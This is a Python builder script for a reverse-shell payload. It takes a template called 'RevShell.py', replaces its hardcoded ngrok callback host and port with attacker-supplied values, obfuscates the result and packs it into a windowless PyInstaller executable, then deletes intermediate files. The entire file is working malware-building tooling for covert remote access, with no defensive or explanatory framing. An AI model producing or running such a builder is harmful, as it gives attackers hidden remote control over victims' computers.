import os
import sys
import base64
import subprocess

def create_file(ip, port, filename):
    # Read the original code from the template file
    with open('RevShell.py', 'r') as f:
        code = f.read()
    
    # Replace the IP and port in the code with user input
    code = code.replace("('0.tcp.eu.ngrok.io', 17117)", f"('{ip}', {port})")
    
    # Write the modified code to a new file with the given filename
    with open(filename, 'w') as f:
        f.write(code)

def build_exe(filename):
    # Build the executable file using PyInstaller
    cmd = f"python3 compress.py {filename} RevShellObf.py"
    subprocess.call(cmd, shell=True)	
    cmd = f"pyinstaller --onefile --noconsole RevShellObf.py"
    subprocess.call(cmd, shell=True)

if __name__ == '__main__':
    # Get the IP, port, and filename from the command line arguments
    ip = sys.argv[1]
    port = sys.argv[2]
    filename = sys.argv[3]
    
    # Create the Python file with the modified IP and port
    create_file(ip, port, filename)
    
    # Build the executable file using PyInstaller
    build_exe(filename)

    # Remove unnecessary files	
    cmd = f"rm -rf {filename}.spec"
    subprocess.call(cmd, shell=True)
    cmd = f"rm -rf {filename}"
    subprocess.call(cmd, shell=True)

    # Granting Permissions	
    cmd = f"chmod +x RevShellObf.py"
    subprocess.call(cmd, shell=True)
    
